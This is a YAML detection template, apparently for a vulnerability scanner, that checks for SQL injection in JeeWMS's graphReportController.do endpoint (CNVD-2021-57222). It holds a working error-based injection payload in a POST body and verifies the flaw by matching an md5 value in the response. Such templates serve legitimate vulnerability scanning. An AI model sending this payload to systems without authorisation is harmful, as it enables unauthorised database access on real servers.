name: poc-yaml-jeewms-graphreportcontroller-sqli
binding: f74c2fc8-5e6a-4b87-be6d-ce90d1003cd3
manual: true
detail:
    author: junfei.song@chaitin.com
    links:
        - https://www.cnvd.org.cn/flaw/show/CNVD-2021-57222
    vulnerability:
        id: CT-529776
        level: high
transport: http
set:
    r1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: ^/jeewms/graphReportController.do?datagridGraph
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: configId=khsltop10&zhong_wen_qch=%27%20AND%20EXTRACTVALUE%285636%2CCONCAT%280x5c%2C0x71786a7071%2C%28SELECT%20MID%28%28IFNULL%28CAST%28md5%28{{r1}}%29%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C21%29%29%2C0x716b6b7071%29%29--%20ouFr
        expression: response.body.bcontains(bytes(md5(string(r1))))
expression: r0()
